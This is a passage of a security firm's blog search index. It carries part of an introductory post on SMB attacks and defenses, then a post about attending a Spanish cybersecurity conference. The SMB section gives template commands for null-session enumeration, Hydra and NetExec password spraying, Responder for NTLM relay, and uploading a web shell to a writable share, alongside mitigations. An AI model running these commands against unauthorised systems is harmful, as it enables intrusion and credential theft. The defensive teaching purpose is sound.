<pre><code>ls      # List current directory (file management and navigation commands similar to Linux)\nget     # Download a file\nput     # Upload a file\n</code></pre> <p>Enumerating shared resources:</p> <pre><code>smbclient -L //&lt;IP&gt; -U &lt;username&gt;\n</code></pre>"},{"location":"blog/2024/11/24/smb-101/#common-smb-attacks","title":"Common SMB Attacks","text":""},{"location":"blog/2024/11/24/smb-101/#null-sessions","title":"Null Sessions","text":"<p>Null sessions occur when an SMB server allows connections without authentication, exposing information such as shared resources and users.</p> <p>Enumerating Null Sessions with smbclient:</p> <pre><code>smbclient -L //&lt;IP&gt; -N\n</code></pre> <p>Danger</p> <p>Attackers can use this information to plan more advanced attacks, such as brute-force password attacks.</p>"},{"location":"blog/2024/11/24/smb-101/#brute-force-and-password-spraying","title":"Brute Force and Password Spraying","text":"<p>SMB can be vulnerable to brute-force attacks if proper security measures are not implemented. Tools like Hydra and Medusa are common for this purpose.</p> <p>Hydra for SMB:</p> <pre><code>hydra -L users.txt -P passwords.txt smb://&lt;IP&gt;\n</code></pre> <p>NetExec:</p> <pre><code>nxc smb &lt;IP&gt; -u users.txt -p passwords.txt\n</code></pre> <p>Danger</p> <p>The attacker may gain unauthorized access to shared resources if valid credentials are cracked.</p>"},{"location":"blog/2024/11/24/smb-101/#ntlm-relay","title":"NTLM Relay","text":"<p>This attack intercepts and forwards NTLM authentications to impersonate the legitimate user. SMB servers with signing disabled are especially vulnerable.</p> <p>Using Responder:</p> <pre><code>responder -I &lt;network_interface&gt;\n</code></pre> <p>Tip</p> <p>In order to mitigate, enable SMB signing and use Kerberos authentication instead of NTLM.</p>"},{"location":"blog/2024/11/24/smb-101/#credential-sniffing","title":"Credential Sniffing","text":"<p>Older versions like SMB1 transmit credentials in plain text, allowing an attacker to capture credentials with tools like Wireshark.</p> <p>Wireshark Filter:</p> <pre><code>tcp.port == 445\n</code></pre> <p>Danger</p> <p>An attacker may use captured credentials to access the SMB server.</p>"},{"location":"blog/2024/11/24/smb-101/#file-upload-for-rce","title":"File Upload for RCE","text":"<p>If an SMB resource allows writing, an attacker may upload malicious files, such as web shells, to execute remote commands.</p> <p>Uploading with SMBClient:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;share_name&gt; -U &lt;username&gt;\nput webshell.aspx\n</code></pre> <p>Danger</p> <p>This can compromise the server, allowing command execution or malware installation.</p>"},{"location":"blog/2024/11/24/smb-101/#defenses-against-smb-exploits","title":"Defenses Against SMB Exploits","text":"<ol> <li> <p>Disable SMB1: It is outdated and vulnerable. Replace it with SMB2 or SMB3:</p> <pre><code>Set-SmbServerConfiguration -EnableSMB1Protocol $false\n</code></pre> </li> <li> <p>Enable SMB Signing: To prevent NTLM relay attacks.</p> </li> <li>Restrict Permissions: Ensure shared resources are protected with strict permissions.</li> <li>SMB3 Encryption: SMB3 allows encrypting traffic, protecting against sniffing.</li> <li>Regular Monitoring: Use tools like Splunk or Wireshark to detect anomalous activity.</li> </ol> <p>In the next article of this series on SMB we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p>"},{"location":"blog/2024/11/30/xviii-jornadas-stic-ccn-cert--vi-jornadas-de-ciberdefensa-espdef-cert/","title":"XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT","text":"<p>Last Tuesday, we had the honor of attending the XVIII Jornadas STIC CCN-CERT | VI Jornadas de Ciberdefensa ESPDEF-CERT, held at the Kin\u00e9polis cinemas in Ciudad de la Imagen, Madrid. The main purpose of this trip was to receive an award granted to our cybersecurity team, who emerged as winners of a national competition organized by the Universidad de Granada in collaboration with the El Mando Conjunto del Ciberespacio (MCCE) and the Instituto Nacional de Ciberseguridad (INCIBE). This recognition not only fills us with pride but also reinforces our commitment to new generations and our confidence in the immense talent of these young professionals.</p> <p>Moreover, we took advantage of our time at this important event to start carving out a space for ourselves in the industry, establishing connections with other companies, and learning from the experiences and advice of leading organizations in the technological landscape, both nationally and internationally.</p> <p>We are convinced that this is the right path, and we are leaving Madrid with great enthusiasm to help all the companies that place their trust in us achieve excellence.</p> <p>#XVIIIJORNADASCCNCERT #VIJORNADASESPDEFCERT</p>"},{"location":"blog/archive/2024/","title":"2024","text":""}]}